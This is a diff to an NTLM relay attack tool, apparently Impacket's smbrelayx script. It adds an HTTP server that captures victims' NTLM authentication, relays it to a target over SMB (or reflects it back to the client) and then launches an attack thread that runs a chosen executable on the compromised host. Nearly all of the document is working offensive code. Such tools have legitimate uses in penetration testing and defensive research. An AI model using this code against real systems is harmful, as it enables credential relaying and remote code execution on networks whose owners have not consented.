@@ -17,7 +17,7 @@
 # list of targets and for every connection received it will choose the next target and try to relay the
 # credentials. Also, if specified, it will first to try authenticate against the client connecting to us.
 # 
-# It is implemented by invoking the smbserver, hooking to a few functions and then using the smbclient
+# It is implemented by invoking a SMB and HTTP Server, hooking to a few functions and then using the smbclient
 # portion. It is supposed to be working on any LM Compatibility level. The only way to stop this attack 
 # is to enforce on the server SPN checks and or signing.
 #
@@ -36,6 +36,9 @@ import os
 import random
 import time
 import argparse
+import SimpleHTTPServer
+import SocketServer
+import base64
 
 from impacket import smbserver, smb, ntlm, dcerpc, version
 from impacket.dcerpc import dcerpc, transport, srvsvc, svcctl
@@ -45,6 +48,8 @@ from impacket.smb import *
 from impacket.smbserver import *
 
 from threading import Thread
+
+
 
 class doAttack(Thread):
     def __init__(self, SMBClient, exeFile):
@@ -203,8 +208,122 @@ class SMBClient(smb.SMB):
 
             return respToken['ResponseToken']
 
-class SMBRelayServer:
+class HTTPRelayServer(Thread):
+    class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
+        def __init__(self, server_address, RequestHandlerClass, target, exeFile, mode):
+            self.target = target
+            self.exeFile = exeFile
+            self.mode = mode
+            SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
+
+    class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+        def __init__(self,request, client_address, server):
+            self.server = server
+            self.protocol_version = 'HTTP/1.1'
+            SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
+
+        def handle_one_request(self):
+            try:
+                SimpleHTTPServer.SimpleHTTPRequestHandler.handle_one_request(self)
+            except:
+                pass
+
+        def log_message(self, format, *args):
+            return
+
+        def do_HEAD(self):
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+
+        def do_AUTHHEAD(self, message = ''):
+            self.send_response(401)
+            self.send_header('WWW-Authenticate', message)
+            self.send_header('Content-type', 'text/html')
+            self.send_header('Content-Length','0')
+            self.end_headers()
+
+        def do_GET(self):
+            print "[*] HTTP: Received connection from %s, attacking target %s" % (self.client_address[0] ,self.server.target)
+            messageType = 0
+            if self.headers.getheader('Authorization') == None:
+                self.do_AUTHHEAD(message = 'NTLM')
+                pass
+            else:
+                #self.do_AUTHHEAD()
+                typeX = self.headers.getheader('Authorization')
+                try:
+                    _, blob = typeX.split('NTLM')
+                    token =  base64.b64decode(blob.strip())
+                except:
+                    self.do_AUTHHEAD()
+                messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
+
+            if messageType == 1:
+                if self.server.mode.upper() == 'REFLECTION':
+                    self.target = self.client_address[0]
+                else:
+                    self.target = self.server.target
+
+                try:
+                    self.client = SMBClient(self.target, extended_security = True)
+                    self.client.set_timeout(60)
+                except Exception, e:
+                   print "[!] Connection against target %s FAILED" % self.target
+                   print e
+
+                clientChallengeMessage = self.client.sendNegotiate(token) 
+                self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(clientChallengeMessage))
+            elif messageType == 3:
+                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
+                authenticateMessage.fromString(token)
+                if authenticateMessage['user_name'] != '':
+                    respToken2 = SPNEGO_NegTokenResp()
+                    respToken2['ResponseToken'] = str(token)
+                    clientResponse, errorCode = self.client.sendAuth(respToken2.getData())                
+                else:
+                    # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
+                    errorCode = STATUS_ACCESS_DENIED
+
+                if errorCode != STATUS_SUCCESS:
+                    print "[!] Authenticating against %s as %s\%s FAILED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name'])
+                    self.do_AUTHHEAD('NTLM')
+                else:
+                    # Relay worked, do whatever we want here...
+                    print "[*] Authenticating against %s as %s\%s SUCCEED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name'])
+
+                    clientThread = doAttack(self.client,self.server.exeFile)
+                    clientThread.start()
+                    # And answer 404 not found
+                    self.send_response(404)
+                    self.send_header('WWW-Authenticate', 'NTLM')
+                    self.send_header('Content-type', 'text/html')
+                    self.send_header('Content-Length','0')
+                    self.end_headers()
+            return 
+
     def __init__(self):
+        Thread.__init__(self)
+        self.daemon = True
+
+    def setTargets(self, target):
+        self.target = target
+
+    def setExeFile(self, filename):
+        self.exeFile = filename
+
+    def setMode(self,mode):
+        self.mode = mode
+
+    def run(self):
+        print "[*] Setting up HTTP Server"
+        self.httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.mode)
+        self.httpd.serve_forever()
+
+class SMBRelayServer(Thread):
+    def __init__(self):
+        Thread.__init__(self)
+        self.daemon = True
         self.server = 0
         self.target = '' 
         self.mode = 'REFLECTION'
@@ -245,7 +364,7 @@ class SMBRelayServer:
             smbClient = smbData[self.target]['SMBClient']
             del(smbClient)
             del (smbData[self.target])
-        print "[*] Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target)
+        print "[*] SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target)
         try: 
             if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
                 extSec = False
@@ -467,8 +586,12 @@ class SMBRelayServer:
 
         return [respSMBCommand], None, errorCode
 
-    def start(self):
+    def _start(self):
         self.server.serve_forever()
+
+    def run(self):
+        print "[*] Setting up SMB Server"
+        self._start()
 
     def setTargets(self, targets):
         self.target = targets 
@@ -482,6 +605,7 @@ class SMBRelayServer:
 # Process command-line arguments.
 if __name__ == '__main__':
 
+    RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )
     print version.BANNER
     parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will try to SMB relay that connection to the target system or the original client")
     parser.add_argument("--help", action="help", help='show this help message and exit')
@@ -497,7 +621,6 @@ if __name__ == '__main__':
        print e
        sys.exit(1)
 
-    print "[*] Setting up SMB Server"
     if options.h is not None:
         print "[*] Running in relay mode"
         mode = 'RELAY'
@@ -508,9 +631,21 @@ if __name__ == '__main__':
         mode = 'REFLECTION'
 
     exeFile = options.e
-    s = SMBRelayServer()
-    s.setTargets(targetSystem)
-    s.setExeFile(exeFile)
-    s.setMode(mode)
-    print "[*] Starting server, waiting for connections"
-    s.start() 
+
+    for server in RELAY_SERVERS:
+        s = server()
+        s.setTargets(targetSystem)
+        s.setExeFile(exeFile)
+        s.setMode(mode)
+        s.start()
+        
+    print ""
+    print "[*] Servers started, waiting for connections"
+    while True:
+        try:
+            sys.stdin.read()
+        except KeyboardInterrupt:
+            sys.exit(1)
+        else:
+            pass
+    print "CHAU"
